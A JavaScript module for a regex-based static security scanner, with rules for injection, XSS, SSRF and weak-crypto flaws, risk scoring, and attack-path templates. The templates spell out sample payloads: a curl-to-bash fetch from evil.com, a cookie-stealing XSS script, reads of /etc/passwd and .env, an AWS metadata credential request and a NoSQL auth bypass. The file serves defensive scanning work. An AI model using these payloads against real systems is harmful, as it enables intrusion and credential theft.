'use strict';

// ─── File type filtering ──────────────────────────────────────────────────────
const SCANNABLE_EXTS = [
  '.js', '.ts', '.jsx', '.tsx', '.mjs', '.cjs',
  '.py', '.rb', '.php', '.java', '.go', '.cs',
  '.cpp', '.c', '.swift', '.kt', '.rs',
  '.html', '.ejs', '.hbs', '.pug',
  '.sh', '.bash',
];
const SKIP_EXTS = [
  '.min.js', '.min.css', '.map', '.lock',
  '.png', '.jpg', '.gif', '.pdf', '.zip',
  '.exe', '.bin', '.ttf', '.woff', '.woff2',
];

function isScannableFile(filePath) {
  const lower = filePath.toLowerCase();
  if (SKIP_EXTS.some(e => lower.endsWith(e))) return false;
  if (/node_modules|vendor\/|dist\/|build\/|\.min\./.test(filePath)) return false;
  return SCANNABLE_EXTS.some(e => lower.endsWith(e));
}

// ─── Comment line check ───────────────────────────────────────────────────────
function isCommentLine(line) {
  const t = line.trim();
  return t.startsWith('//') || t.startsWith('#') || t.startsWith('*') ||
         t.startsWith('/*') || t.startsWith('<!--') || t.startsWith('--');
}

// ─── Unique ID ────────────────────────────────────────────────────────────────
function uid(prefix) {
  return prefix + '-' + Date.now() + '-' + Math.random().toString(36).substring(2, 7);
}

// ─── SAST Rules (18 total) ────────────────────────────────────────────────────
const RULES = [
  {
    id: 'SAST-001', name: 'SQL Injection', cwe: 'CWE-89', sev: 'CRITICAL',
    owasp: 'A03:2021', mitre: 'T1190', confidence: 'HIGH',
    desc: 'User input concatenated directly into SQL query. Enables full database compromise.',
    fix:  'Use parameterized queries: db.query("SELECT * FROM users WHERE id = ?", [id])',
    patterns: [
      /["'`][^"'`]*(SELECT|INSERT|UPDATE|DELETE|DROP|UNION)[^"'`]*["'`]\s*\+/gi,
      /`[^`]*(SELECT|INSERT|UPDATE|DELETE|DROP|UNION)[^`]*\$\{[^}]*(?:req\.|params\.|query\.|body\.)[^}]*\}`/gi,
      /(?:\.query|\.execute)\s*\(\s*["'`][^"'`]*(SELECT|INSERT|UPDATE|DELETE)/gi,
      /"SELECT.*"\s*\+\s*(?:req\.|params\.|query\.|body\.)/gi,
    ]
  },
  {
    id: 'SAST-002', name: 'Command Injection', cwe: 'CWE-78', sev: 'CRITICAL',
    owasp: 'A03:2021', mitre: 'T1059', confidence: 'HIGH',
    desc: 'User-controlled data passed to OS shell. Enables remote code execution.',
    fix:  'Use execFile(cmd, [args], {shell:false}). Never pass user input to exec().',
    patterns: [
      /exec\s*\(\s*["'`][^"'`]*["'`]\s*\+/gi,
      /exec\s*\(`[^`]*\$\{/gi,
      /execSync\s*\(`[^`]*\$\{/gi,
      /spawnSync\s*\(\s*["'`][^"'`]*["'`]\s*\+/gi,
      /subprocess\.(call|run|Popen)\s*\([^)]*shell\s*=\s*True/gi,
      /os\.system\s*\([^)]*(?:req\.|request\.|input\()/gi,
    ]
  },
  {
    id: 'SAST-003', name: 'Cross-Site Scripting (XSS)', cwe: 'CWE-79', sev: 'HIGH',
    owasp: 'A03:2021', mitre: 'T1185', confidence: 'HIGH',
    desc: 'Unescaped user input rendered as HTML. Enables session hijacking and phishing.',
    fix:  'Use textContent instead of innerHTML. Sanitize with DOMPurify.sanitize(input).',
    patterns: [
      /innerHTML\s*=\s*(?!["'`])[^;]*(?:req\.|request\.|params\.|query\.|body\.)/gi,
      /innerHTML\s*\+=\s*/gi,
      /document\.write\s*\([^)]*(?:\+|\$\{)/gi,
      /dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html/gi,
      /res\.send\s*\([^)]*(?:req\.query|req\.params|req\.body)[^)]*\)/gi,
    ]
  },
  {
    id: 'SAST-004', name: 'Path Traversal', cwe: 'CWE-22', sev: 'HIGH',
    owasp: 'A01:2021', mitre: 'T1083', confidence: 'HIGH',
    desc: 'Unvalidated file path allows access outside intended directory.',
    fix:  'Resolve and validate: const safe = path.resolve(BASE, input); assert(safe.startsWith(BASE))',
    patterns: [
      /(?:readFile|readFileSync|createReadStream)\s*\([^)]*(?:req\.|params\.|query\.)/gi,
      /res\.sendFile\s*\([^)]*(?:req\.|params\.|query\.)/gi,
      /fs\.\w+\s*\([^)]*(?:\+|`)[^)]*(?:req\.|params\.|query\.)/gi,
      /open\s*\([^)]*(?:request\.|input\()/gi,
    ]
  },
  {
    id: 'SAST-005', name: 'Insecure Deserialization / Eval', cwe: 'CWE-502', sev: 'CRITICAL',
    owasp: 'A08:2021', mitre: 'T1059', confidence: 'HIGH',
    desc: 'eval() or deserialize() on untrusted data enables remote code execution.',
    fix:  'Use JSON.parse() for data. Never call eval() with user-controlled input.',
    patterns: [
      /eval\s*\(\s*(?!["'`])[^)]*(?:req\.|body\.|params\.|query\.)/gi,
      /new\s+Function\s*\([^)]*(?:req\.|body\.)/gi,
      /unserialize\s*\(/gi,
      /pickle\.loads?\s*\([^)]*(?:request\.|input)/gi,
      /yaml\.load\s*\([^,)]+\)(?!\s*,\s*Loader)/gi,
    ]
  },
  {
    id: 'SAST-006', name: 'Server-Side Request Forgery (SSRF)', cwe: 'CWE-918', sev: 'HIGH',
    owasp: 'A10:2021', mitre: 'T1090', confidence: 'MEDIUM',
    desc: 'Server makes HTTP request to user-controlled URL. Can access internal services.',
    fix:  'Validate URL against allowlist. Block private IPs (127.x, 10.x, 192.168.x, 169.254.x).',
    patterns: [
      /(?:axios\.get|axios\.post|fetch|http\.get|https\.get|request\.get)\s*\(\s*(?:req\.|request\.)/gi,
      /(?:axios|fetch)\s*\(\s*(?:req\.query|req\.body|req\.params)/gi,
      /fetch\s*\(`[^`]*\$\{[^}]*req\./gi,
    ]
  },
  {
    id: 'SAST-007', name: 'Prototype Pollution', cwe: 'CWE-1321', sev: 'HIGH',
    owasp: 'A03:2021', mitre: 'T1190', confidence: 'MEDIUM',
    desc: 'Attacker-controlled keys pollute Object.prototype and affect all objects globally.',
    fix:  'Reject __proto__, constructor, prototype keys. Use Object.create(null).',
    patterns: [
      /Object\.assign\s*\(\s*(?:this|prototype|__proto__|obj)/gi,
      /\[\s*["']__proto__["']\s*\]/gi,
      /\[\s*["']constructor["']\s*\]\s*\[\s*["']prototype["']\s*\]/gi,
      /(?:_|lodash)\.merge\s*\([^)]*(?:req\.|body\.)/gi,
    ]
  },
  {
    id: 'SAST-008', name: 'Weak Cryptography', cwe: 'CWE-327', sev: 'MEDIUM',
    owasp: 'A02:2021', mitre: 'T1552', confidence: 'HIGH',
    desc: 'MD5 and SHA-1 are cryptographically broken. Do not use for passwords or signatures.',
    fix:  'Use crypto.createHash("sha256") for integrity. Use bcrypt/argon2 for passwords.',
    patterns: [
      /createHash\s*\(\s*["']md5["']/gi,
      /createHash\s*\(\s*["']sha1["']/gi,
      /hashlib\.md5\s*\(/gi,
      /hashlib\.sha1\s*\(/gi,
      /createCipheriv\s*\(\s*["'](?:des|rc4|rc2)/gi,
    ]
  },
  {
    id: 'SAST-009', name: 'Unvalidated Redirect', cwe: 'CWE-601', sev: 'MEDIUM',
    owasp: 'A01:2021', mitre: 'T1185', confidence: 'HIGH',
    desc: 'Redirect URL from user input enables phishing and open redirect attacks.',
    fix:  'Whitelist allowed redirect destinations. Never redirect to req.query.url directly.',
    patterns: [
      /res\.redirect\s*\([^)]*(?:req\.query|req\.body|req\.params)/gi,
      /header\s*\(\s*["']Location:\s*["']\s*\.\s*(?:\$_GET|\$_POST)/gi,
    ]
  },
  {
    id: 'SAST-010', name: 'Debug Mode in Production', cwe: 'CWE-215', sev: 'MEDIUM',
    owasp: 'A05:2021', mitre: 'T1082', confidence: 'MEDIUM',
    desc: 'Debug mode exposes stack traces, internal state, and source maps in production.',
    fix:  'Use: debug: process.env.NODE_ENV === "development"',
    patterns: [
      /debug\s*[:=]\s*true/gi,
      /app\.run\s*\([^)]*debug\s*=\s*True/g,
      /app\.set\s*\(\s*["']env["']\s*,\s*["']development["']\s*\)/gi,
    ]
  },
  {
    id: 'SAST-011', name: 'Hardcoded JWT Secret', cwe: 'CWE-798', sev: 'CRITICAL',
    owasp: 'A02:2021', mitre: 'T1552', confidence: 'HIGH',
    desc: 'JWT signed with hardcoded secret allows token forgery and authentication bypass.',
    fix:  'Use process.env.JWT_SECRET. Generate with: openssl rand -hex 64',
    patterns: [
      /jwt\.sign\s*\([^,]+,\s*["'][^"']{8,}["']/gi,
      /jwt\.verify\s*\([^,]+,\s*["'][^"']{8,}["']/gi,
    ]
  },
  {
    id: 'SAST-012', name: 'NoSQL Injection', cwe: 'CWE-943', sev: 'CRITICAL',
    owasp: 'A03:2021', mitre: 'T1190', confidence: 'MEDIUM',
    desc: 'Unsanitized user input in MongoDB query. Attacker can inject $where, $gt operators.',
    fix:  'Sanitize with mongo-sanitize. Never pass req.body directly to find() or findOne().',
    patterns: [
      /\.find\s*\(\s*(?:req\.body|req\.query|req\.params)\s*\)/gi,
      /\.findOne\s*\(\s*(?:req\.body|req\.query)\s*\)/gi,
      /\$where\s*:\s*["'`][^"'`]*["'`]/gi,
    ]
  },
  {
    id: 'SAST-013', name: 'Insecure Cookie', cwe: 'CWE-614', sev: 'MEDIUM',
    owasp: 'A05:2021', mitre: 'T1185', confidence: 'HIGH',
    desc: 'Cookie without Secure or HttpOnly flag can be stolen via XSS or network sniffing.',
    fix:  'Set: res.cookie("session", val, { httpOnly: true, secure: true, sameSite: "strict" })',
    patterns: [
      /res\.cookie\s*\([^)]+\)(?![\s\S]{0,100}httpOnly)/gi,
    ]
  },
  {
    id: 'SAST-014', name: 'Sensitive Data in Logs', cwe: 'CWE-532', sev: 'MEDIUM',
    owasp: 'A09:2021', mitre: 'T1552', confidence: 'MEDIUM',
    desc: 'Passwords or tokens logged to console. Can appear in log aggregation systems.',
    fix:  'Never log passwords, tokens, or PII. Log only sanitized metadata.',
    patterns: [
      /console\.log\s*\([^)]*(?:password|passwd|token|secret|apiKey|api_key)/gi,
      /logger\.\w+\s*\([^)]*(?:password|passwd|token|secret)/gi,
    ]
  },
  {
    id: 'SAST-015', name: 'Insecure Randomness', cwe: 'CWE-330', sev: 'MEDIUM',
    owasp: 'A02:2021', mitre: 'T1552', confidence: 'HIGH',
    desc: 'Math.random() is not cryptographically secure. Predictable tokens can be forged.',
    fix:  'Use crypto.randomBytes(32).toString("hex") for tokens and session IDs.',
    patterns: [
      /Math\.random\s*\(\s*\)/gi,
    ]
  },
  {
    id: 'SAST-016', name: 'XML External Entity (XXE)', cwe: 'CWE-611', sev: 'HIGH',
    owasp: 'A05:2021', mitre: 'T1190', confidence: 'MEDIUM',
    desc: 'XML parser with external entities enabled can read server files or cause SSRF.',
    fix:  'Disable external entities in XML parser configuration.',
    patterns: [
      /LIBXML_NOENT/gi,
      /loadXML\s*\(/gi,
      /new\s+DOMParser\s*\(\s*\).*parseFromString/gi,
    ]
  },
  {
    id: 'SAST-017', name: 'Missing Rate Limiting', cwe: 'CWE-799', sev: 'MEDIUM',
    owasp: 'A04:2021', mitre: 'T1498', confidence: 'LOW',
    desc: 'Login or auth endpoint has no rate limiting. Enables brute-force attacks.',
    fix:  'Use express-rate-limit: app.use("/login", rateLimit({ max: 10, windowMs: 15*60*1000 }))',
    patterns: [
      /router\.(post)\s*\(\s*["'][^"']*(?:login|signin|auth|token)[^"']*["']/gi,
    ]
  },
  {
    id: 'SAST-018', name: 'Missing Authentication Check', cwe: 'CWE-306', sev: 'HIGH',
    owasp: 'A07:2021', mitre: 'T1190', confidence: 'LOW',
    desc: 'Admin/sensitive route handler with no visible authentication middleware.',
    fix:  'Add authentication middleware: router.use(requireAuth) before sensitive routes.',
    patterns: [
      /router\.(get|post|put|delete|patch)\s*\(\s*["'][^"']*(?:admin|dashboard|manage)[^"']*["']\s*,\s*(?:async\s*)?\([^)]*\)\s*=>/gi,
    ]
  },
];

// ─── Main SAST scan ───────────────────────────────────────────────────────────
function scanSAST(content, filePath) {
  if (!isScannableFile(filePath)) return [];

  const findings = [];
  const lines    = content.split('\n');
  const seen     = new Set();

  for (const rule of RULES) {
    for (const pattern of rule.patterns) {
      try {
        const re = new RegExp(pattern.source, pattern.flags);
        let match;
        while ((match = re.exec(content)) !== null) {
          const lineNum  = content.substring(0, match.index).split('\n').length;
          const lineText = lineNum <= lines.length ? lines[lineNum - 1] : '';

          if (isCommentLine(lineText)) continue;

          // Skip test files for LOW confidence rules
          if (rule.confidence === 'LOW' && /test|spec|mock|__tests__/.test(filePath)) continue;

          const key = rule.id + ':' + lineNum;
          if (seen.has(key)) continue;
          seen.add(key);

          findings.push({
            id:          uid(rule.id),
            type:        'SAST',
            name:        rule.name,
            severity:    rule.sev,
            cwe:         rule.cwe,
            owasp:       rule.owasp,
            mitre:       rule.mitre,
            confidence:  rule.confidence,
            file:        filePath,
            line:        lineNum,
            lineText:    lineText.trim().substring(0, 120),
            description: rule.desc,
            remediation: rule.fix,
          });
        }
      } catch (_) {}
    }
  }

  return findings;
}

// ─── Risk scoring ─────────────────────────────────────────────────────────────
function riskScore(findings) {
  if (!findings.length) return {
    score: 0, level: 'PASS', label: 'PASS', grade: 'A',
    criticals: 0, highs: 0, mediums: 0, total: 0
  };

  const W  = { CRITICAL: 10, HIGH: 5, MEDIUM: 2, LOW: 0.5 };
  const CM = { HIGH: 1.0, MEDIUM: 0.7, LOW: 0.4 };

  const raw = findings.reduce((acc, f) => {
    return acc + (W[f.severity] || 1) * (CM[f.confidence] || 1.0);
  }, 0);

  const score     = Math.min(100, Math.round(raw * 2));
  const criticals = findings.filter(f => f.severity === 'CRITICAL').length;
  const highs     = findings.filter(f => f.severity === 'HIGH').length;
  const mediums   = findings.filter(f => f.severity === 'MEDIUM').length;

  let level, label, grade;
  if (criticals > 0 || score >= 80)  { level = 'FAIL'; label = 'FAILED';       grade = 'F'; }
  else if (score >= 50 || highs > 2) { level = 'WARN'; label = 'BLOCK_DEPLOY'; grade = 'D'; }
  else if (score >= 25)              { level = 'WARN'; label = 'WARN';          grade = 'C'; }
  else if (score >= 10)              { level = 'PASS'; label = 'PASS';          grade = 'B'; }
  else                               { level = 'PASS'; label = 'PASS';          grade = 'A'; }

  return { score, level, label, grade, criticals, highs, mediums, total: findings.length };
}

// ─── Attack paths — signature matches scan.js: attackPaths(findings, repoName)
function attackPaths(findings, repoName) {
  const paths   = [];
  const yr      = new Date().getFullYear();
  let   counter = 100;

  const byName = (kw) => findings.filter(f => f.name.toLowerCase().includes(kw.toLowerCase()));

  const TEMPLATES = [
    {
      filter: 'SQL Injection', cwe: 'CWE-89', mitre: 'T1190', severity: 'CRITICAL',
      title: 'SQL Injection → Full Database Compromise',
      steps: (f) => [
        `Attacker identifies unsanitized SQL query in ${f.file} line ${f.line}.`,
        "Injects ' OR 1=1-- to bypass auth or UNION SELECT to enumerate all tables.",
        'Dumps all user credentials, PII, session tokens, and payment data.',
        'Drops tables or installs persistent backdoor via xp_cmdshell.',
      ]
    },
    {
      filter: 'Command Injection', cwe: 'CWE-78', mitre: 'T1059', severity: 'CRITICAL',
      title: 'Command Injection → Remote Code Execution → Full Server Compromise',
      steps: (f) => [
        `exec() called with user-controlled input at ${f.file} line ${f.line}.`,
        'Attacker injects: ; curl http://evil.com/shell.sh | bash',
        'Executes arbitrary OS commands on production server.',
        'Establishes persistent reverse shell. All server data exfiltrated.',
      ]
    },
    {
      filter: 'XSS', cwe: 'CWE-79', mitre: 'T1185', severity: 'HIGH',
      title: 'Stored XSS → Session Hijacking → Account Takeover',
      steps: (f) => [
        `innerHTML assigned user input at ${f.file} line ${f.line}.`,
        'Attacker stores <script>document.location="https://evil.com?c="+document.cookie</script>.',
        'Every user who loads the page executes the payload in their browser.',
        'Session cookies exfiltrated. Attacker hijacks authenticated sessions.',
      ]
    },
    {
      filter: 'Path Traversal', cwe: 'CWE-22', mitre: 'T1083', severity: 'HIGH',
      title: 'Path Traversal → Sensitive File Disclosure',
      steps: (f) => [
        `Unvalidated file path at ${f.file} line ${f.line}.`,
        'Attacker requests: ?file=../../etc/passwd or ?file=../../.env',
        'Server reads and returns system files or environment variables.',
        'AWS keys, DB credentials, JWT secrets exposed.',
      ]
    },
    {
      filter: 'JWT', cwe: 'CWE-798', mitre: 'T1552', severity: 'CRITICAL',
      title: 'Hardcoded JWT Secret → Token Forgery → Authentication Bypass',
      steps: (f) => [
        `JWT signed with hardcoded secret at ${f.file} line ${f.line}.`,
        'Attacker extracts secret from public repository.',
        'Forges JWT with arbitrary claims: {"role":"admin","userId":"any"}.',
        'Bypasses all authentication. Full admin access to any account.',
      ]
    },
    {
      filter: 'SSRF', cwe: 'CWE-918', mitre: 'T1090', severity: 'HIGH',
      title: 'SSRF → Internal Network Access → Cloud Metadata Theft',
      steps: (f) => [
        `Server-side HTTP request with user-controlled URL at ${f.file} line ${f.line}.`,
        'Attacker sends: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        'AWS EC2 metadata service returns temporary credentials.',
        'Attacker uses leaked cloud credentials to access all AWS resources.',
      ]
    },
    {
      filter: 'NoSQL', cwe: 'CWE-943', mitre: 'T1190', severity: 'CRITICAL',
      title: 'NoSQL Injection → Authentication Bypass → Data Exfiltration',
      steps: (f) => [
        `MongoDB query receives unsanitized req.body at ${f.file} line ${f.line}.`,
        'Attacker sends: {"username": {"$gt": ""}, "password": {"$gt": ""}}',
        'MongoDB matches all documents — authentication completely bypassed.',
        'Full database contents accessible without valid credentials.',
      ]
    },
  ];

  for (const tpl of TEMPLATES) {
    const matches = byName(tpl.filter);
    if (!matches.length) continue;
    const f = matches[0];
    paths.push({
      id:       `SEC-PATH-${yr}-${counter++}`,
      cwe:      tpl.cwe,
      mitre:    tpl.mitre,
      severity: tpl.severity,
      title:    tpl.title,
      file:     f.file,
      line:     f.line,
      steps:    tpl.steps(f),
    });
  }

  if (!paths.length) {
    paths.push({
      id:       `SEC-PATH-${yr}-000`,
      cwe:      'N/A',
      severity: 'INFO',
      title:    'No Critical Attack Paths Detected',
      file:     '—',
      line:     0,
      mitre:    'N/A',
      steps: [
        'No critical or high-severity vulnerabilities found.',
        'Continue monitoring future commits with automated CI scanning.',
      ]
    });
  }

  return paths;
}

module.exports = { scanSAST, riskScore, attackPaths, isScannableFile };
